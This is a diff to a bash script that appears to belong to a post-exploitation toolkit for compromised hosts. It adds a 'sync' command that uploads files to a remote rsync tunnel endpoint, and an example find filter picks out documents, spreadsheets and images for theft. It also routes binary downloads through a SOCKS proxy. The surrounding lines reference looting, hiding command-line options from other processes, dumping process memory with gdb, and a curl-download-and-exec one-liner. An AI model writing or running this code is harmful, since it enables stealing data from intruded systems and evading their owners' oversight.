@@ -36,22 +36,22 @@ _HS_INTERNET_ALLOWED=
 
 _hs_init_color() {
     [ -n "$CY" ] && return
-    CY="\033[1;33m" # yellow
-    CG="\033[1;32m" # green
-    CR="\033[1;31m" # red
-    CB="\033[1;34m" # blue
-    CM="\033[1;35m" # magenta
-    CC="\033[1;36m" # cyan
-    CDR="\033[0;31m" # red
-    CDG="\033[0;32m" # green
-    CDY="\033[0;33m" # yellow
-    CDB="\033[0;34m" # blue
-    CDM="\033[0;35m"
-    CDC="\033[0;36m" # cyan
-    CF="\033[2m"    # faint
-    CN="\033[0m"    # none
-    CW="\033[1;37m" # white
-    CUL="\e[4m"
+    CG=$'\033[1;32m' # green
+    CY=$'\033[1;33m' # yellow
+    CR=$'\033[1;31m' # red
+    CB=$'\033[1;34m' # blue
+    CM=$'\033[1;35m' # magenta
+    CC=$'\033[1;36m' # cyan
+    CDR=$'\033[0;31m' # red
+    CDG=$'\033[0;32m' # green
+    CDY=$'\033[0;33m' # yellow
+    CDB=$'\033[0;34m' # blue
+    CDM=$'\033[0;35m'
+    CDC=$'\033[0;36m' # cyan
+    CF=$'\033[2m'    # faint
+    CN=$'\033[0m'    # none
+    CW=$'\033[1;37m' # white
+    CUL=$'\033[4m'
 }
 
 _hs_init_rootfs() {
@@ -837,7 +837,7 @@ xkeep() {
 
 proxy() {
     local proto host
-    local str="$1"
+    local str="${1:-${S6_TUN_TCP_SOCKS5H}}"
 
     proto="socks5h://"
     [[ "${str}" == *"://"* ]] && proto="${str%%://*}://"
@@ -1233,6 +1233,8 @@ bin() {
     os="$(uname -s)"
     [ -z "$os" ] && os="Linux"
 
+    # If a reverse proxy is set, use it for downloading binaries:
+    [ -n "$S6_TUN_TCP_SOCKS5H" ] && _HS_USE_PROXY="${S6_TUN_TCP_SOCKS5H}"
     if [ $# -eq 0 ]; then
         _bin_single # install all
         [ -z "$FORCE" ] && echo -e ">>> Use ${CDC}FORCE=1 bin${CN} to download all" 
@@ -1243,6 +1245,7 @@ bin() {
             shift 1
         done
     fi
+    unset _HS_USE_PROXY
 
     { [[ "$optsstr" == *"zapper"* ]] || [[ -z "$optsstr" ]]; } && echo -e ">>> ${CW}TIP${CN}: Type ${CDC}zapme${CN} to hide all command line options\n>>> from your current shell and all further processes."
 
@@ -1824,6 +1827,45 @@ memdump() {
         # gdb --batch --pid "$pid" "/proc/${pid}/exe" -ex "dump memory ${out} 0x${x%%-*} 0x${x##*-}" &>/dev/null
         gdb --batch --pid "$pid" -ex "dump memory ${out} 0x${x%%-*} 0x${x##*-}"
     done
+}
+
+
+_hs_sync_s6() {
+    local opts=(-ahrRz --partial --info=progress2 --size-only)
+    if [ $# -eq 0 ]; then
+        [ -t 0 ] && {
+            cat <<EOF >&2
+${CDM}Examples:
+  ${CDC}sync *.php *.tar.gz  ${CN}${CF}# Uploads to ${CDY}${CF}./sync/${S6_NAME}/
+  ${CDC}sync /var/www/html   ${CN}${CF}# Uploads to ${CDY}${CF}./sync/${S6_NAME}/var/www/html
+  ${CDC}sync /var/www/./html ${CN}${CF}# Uploads to ${CDY}${CF}./sync/${S6_NAME}/html
+${CDM}Files modified in the last 364 days, larger than 1 KiB and smaller than 16 MiB:${CDC}
+  r=(-regextype egrep -iregex '.*\.(pdf|doc|docx|xls|xlsx|zip|xml|jpg|jpeg|png|csv)$')
+  find . "\${r[@]}" -type f -size +1024c -size -16777216c -mtime -364 -print0 | sync${CN}
+EOF
+            return 1
+        }
+        opts+=(--from0 --files-from=-)
+        set -- .
+    fi
+    rsync "${opts[@]}" -- "$@" "rsync://${S6_TUN_TCP_SYNC}/sync/"
+}
+
+declare -F exfil >/dev/null || {
+exfil() {
+    _hs_dep rsync
+    echo >&2 "Type ${CDC}exfil${CN} on segfault first."
+    return 255
+}
+}
+
+sync() {
+    _hs_dep rsync
+    [ -z "$S6_TUN_TCP_SYNC" ] && {
+        exfil "$@"
+        return
+    }
+    _hs_sync_s6 "$@"
 }
 
 gs-exfil-server() {
@@ -2975,6 +3017,7 @@ hs_init_dl() {
             local opts=()
             _hs_internet_allowed || return 255
             [ -n "$UNSAFE" ] && opts=("-k")
+            [ -n "$_HS_USE_PROXY" ] && opts+=("--proxy" "socks5h://${_HS_USE_PROXY}")
             curl -fsSL "${opts[@]}" --connect-timeout 7 --retry 2 "${1:?}"
         }
     elif which wget &>/dev/null; then
@@ -3080,6 +3123,7 @@ ${CY}>>>>> ${CDC}curl -obash -SsfL '$str' && chmod 700 bash && exec ./bash -il"
 
     HS_SSH_OPT=()
     command -v ssh >/dev/null && {
+	unset str
         command ssh -oStrictHostKeyChecking=accept-new -V 2>/dev/null 1>/dev/null || str="no"
         HS_SSH_OPT+=("-oStrictHostKeyChecking=${str:-accept-new}")
         # HS_SSH_OPT+=("-oUpdateHostKeys=no")
@@ -3435,6 +3479,7 @@ hs_info() {
         echo -e "${CDY}${CF}$(w -h 2>/dev/null)${CN}"
     }
 
+    [ -n "$S6_TUN_TCP_SYNC" ] && echo -e "🚀 Type ${CDC}sync${CN} to exfil files"
     # This will also init ghost()
     _hs_init_ghost && echo -e "Ghost IP active. Try ${CDC}ghost <PID>${CN}"
 }
@@ -3490,6 +3535,7 @@ ${CDC} xhelp                                 ${CDM}This help${CN}\n"
     _hs_init_color
 }
 
+unset CY
 _hs_init_color
 ### Programm
 hs_init "$0"
@@ -3502,7 +3548,6 @@ hs_info
     [ -n "$_HS_HUSH" ] && echo -e ">>> Fast Mode. Type ${CDC}lootlight${CN} to loot."
     [ -z "$_HS_HUSH" ] && {
         echo -e ">>> Type ${CDC}loot${CN} or ${CDC}xhelp${CN} to get your started"
-        # xhelp
 
         lootlight
         # Warning if thc.org is used
